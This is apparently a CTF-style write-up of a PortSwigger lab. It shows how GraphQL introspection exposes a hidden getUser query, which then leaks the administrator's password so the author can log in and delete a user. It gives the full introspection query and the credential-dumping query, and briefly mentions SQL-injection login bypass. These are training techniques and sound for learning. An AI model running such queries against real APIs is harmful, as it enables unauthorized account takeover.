# Accidental exposure of private GraphQL fields

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/graphql/lab-graphql-accidental-field-exposure), you'll learn: Discovering private GraphQL field using introspection! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

The user management functions for this lab are powered by a GraphQL endpoint. The lab contains an [access control](https://portswigger.net/web-security/access-control) vulnerability whereby you can induce the API to reveal user credential fields.

To solve the lab, sign in as the administrator and delete the username `carlos`.

We recommend that you install the InQL extension before attempting this lab. InQL makes it easier to modify GraphQL queries in Repeater, and enables you to scan the API schema.

For more information on using InQL, see [Working with GraphQL in Burp Suite](https://portswigger.net/burp/documentation/desktop/testing-workflow/session-management/working-with-graphql).

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Testing-GraphQL-APIs/GraphQL-2/images/Pasted%20image%2020230705155317.png)

In here, we can view some blog posts.

**View source page:**
```html
[...]
<script src="/resources/js/gqlUtil.js"></script>
<script src="/resources/js/blogSummaryGql.js"></script>
<script>displayContent('/post', 'postId')</script>
[...]
```

In the index page, 2 JavaScript files were imported, and executed function `displayContent()`.

**In `/resources/js/blogSummaryGql.js`, we can find a GraphQL query:** 
```js
const OPERATION_NAME = 'getBlogSummaries';

const QUERY = `
query ${OPERATION_NAME} {
    getAllBlogPosts {
        image
        title
        summary
        id
    }
}`;
[...]
```

**`/resources/js/gqlUtil.js`:**
```js
[...]
const sendQuery = (query, onGet, onErrors, onException) => {
    fetch(
            '/graphql/v1',
            {
                method: 'POST',
                headers: {
                    "Content-Type": "application/json",
                    "Accept": "application/json"
                },
                body: JSON.stringify(query)
            }
        )
        .then(response => response.json())
        .then(response => {
            const errors = response['errors'];
            if (errors) {
                onErrors(...errors);
            } else {
                onGet(response['data']);
            }
        })
        .catch(onException);
};
```

In here, we can see that the GraphQL API endpoint is at `/graphql/v1`.

Burp Suite HTTP history:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Testing-GraphQL-APIs/GraphQL-2/images/Pasted%20image%2020230705155741.png)

When we go to the index page, it'll fetch all blog posts data via a GraphQL query `getAllBlogPosts`.

**Query:**
```graphql
query getBlogSummaries {
    getAllBlogPosts {
        image
        title
        summary
        id
    }
}
```

**Now, we can try to probe for introspection:**
```graphql
query {
    __schema{queryType{name}}
}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Testing-GraphQL-APIs/GraphQL-2/images/Pasted%20image%2020230705160210.png)

As you can see, the GraphQL API's introspection is enabled.

**To retrieve the GraphQL schema, we can use the following query:**
```graphql
query IntrospectionQuery {
    __schema {
        queryType {
            name
        }
        mutationType {
            name
        }
        subscriptionType {
            name
        }
        types {
         ...FullType
        }
        directives {
            name
            description
            args {
                ...InputValue
        }
        }
    }
}

fragment FullType on __Type {
    kind
    name
    description
    fields(includeDeprecated: true) {
        name
        description
        args {
            ...InputValue
        }
        type {
            ...TypeRef
        }
        isDeprecated
        deprecationReason
    }
    inputFields {
        ...InputValue
    }
    interfaces {
        ...TypeRef
    }
    enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
    }
    possibleTypes {
        ...TypeRef
    }
}

fragment InputValue on __InputValue {
    name
    description
    type {
        ...TypeRef
    }
    defaultValue
}

fragment TypeRef on __Type {
    kind
    name
    ofType {
        kind
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
            }
        }
    }
}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Testing-GraphQL-APIs/GraphQL-2/images/Pasted%20image%2020230705160349.png)

**In that response, we can find some interesting types and queries:**

- Type:
    - `BlogPost` (Field: `id`, `image`, `title`, `author`, `date`, `summary`, `paragraphs`)
    - `ChangeEmailResponse` (Field: `email`)
    - `LoginResponse` (Field: `token`, `success`)
    - `User` (Field: `id`, `username`, `password`)
- Mutation query:
    - `login(input: LoginInput!)`
    - `changeEmail(input: ChangeEmailInput!)`
- Query:
    - `getBlogPost(id: ID!)`
    - `getAllBlogPosts`
    - `getUser(id: ID!)`

Armed with above information, we can first try to retrieve all blog posts via query `getAllBlogPosts`:

```graphql
query {
    getAllBlogPosts {
        id
        image
        title
        author
        date
        summary
        paragraphs
    }
}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Testing-GraphQL-APIs/GraphQL-2/images/Pasted%20image%2020230705162454.png)

However, nothing weird...

**In this web application, we can also login an account:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Testing-GraphQL-APIs/GraphQL-2/images/Pasted%20image%2020230705162908.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Testing-GraphQL-APIs/GraphQL-2/images/Pasted%20image%2020230705162922.png)

**View source page:**
```html
[...]
<section>
    <form class="login-form" onsubmit="gqlLogin(this, event, '/my-account')">
        <input required type="hidden" name="csrf" value="6HnVro05GmcsWYiCpvYr4j7qsyPARkEk">
        <label>Username</label>
        <input required type=username name="username" autofocus>
        <label>Password</label>
        <input required type=password name="password">
        <button class=button type=submit> Log in </button>
    </form>
    <script src='/resources/js/gqlUtil.js'></script>
    <script src='/resources/js/loginGql.js'></script>
</section>
[...]
```

In here, we found a new JavaScript import.

**`/resources/js/loginGql.js`:**
```js
const OPERATION_NAME = 'login';

const MUTATION = `
    mutation ${OPERATION_NAME}($input: LoginInput!) {
        login(input: $input) {
            token
            success
        }
    }`;

const UNEXPECTED_ERROR = 'Unexpected error while trying to log in'
const INVALID_CREDENTIALS = 'Invalid username or password.'

const getLoginMutation = (username, password) => ({
    query: MUTATION,
    operationName: OPERATION_NAME,
    variables: {
        input: {
            username,
            password
        }
    }
});

const displayErrorMessages = (...messages) => {
    [...]
};

const redirectOnSuccess = (redirectPath) => {
    [...]
};

const gqlLogin = (formElement, event, accountDetailsPath) => {
    event.preventDefault();

    const formData = new FormData(formElement);
    const { username, password } = Object.fromEntries(formData.entries())

    const loginMutation = getLoginMutation(username, password);

    sendQuery(loginMutation, redirectOnSuccess(accountDetailsPath), handleErrors(displayErrorMessages), () => displayErrorMessages(UNEXPECTED_ERROR));
};
```

When the "Log in" button is clicked, it'll send a GraphQL mutation query `login`, with variable `username` and `password`. The result is expected to return field `token` and `success`.

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Testing-GraphQL-APIs/GraphQL-2/images/Pasted%20image%2020230705163408.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Testing-GraphQL-APIs/GraphQL-2/images/Pasted%20image%2020230705163419.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Testing-GraphQL-APIs/GraphQL-2/images/Pasted%20image%2020230705163427.png)

**Mutation query `login`:**
```graphql
mutation login($input: LoginInput!) {
    login(input: $input) {
        token
        success
    }
}
```

**Variable:**
```json
{
    "input": {
        "password": "bal", 
        "username": "anything"
    }
}
```

We could try to perform SQL injection to bypass the authentication.

**However, we actually found a "hidden" query in the introspection query `getUser(id: ID!)`!**

**With that said, we can try to retrieve some users' `username` and `password`!**
```graphql
query {
    getUser(id: 1) {
        id
        username
        password
    }
}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Testing-GraphQL-APIs/GraphQL-2/images/Pasted%20image%2020230705163713.png)

Oh! It worked! And we found `administrator`'s password!

**Let's login and delete user `carlos`!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Testing-GraphQL-APIs/GraphQL-2/images/Pasted%20image%2020230705163814.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Testing-GraphQL-APIs/GraphQL-2/images/Pasted%20image%2020230705163826.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Testing-GraphQL-APIs/GraphQL-2/images/Pasted%20image%2020230705163839.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Testing-GraphQL-APIs/GraphQL-2/images/Pasted%20image%2020230705163849.png)

# What we've learned:

1. Discovering private GraphQL field using introspection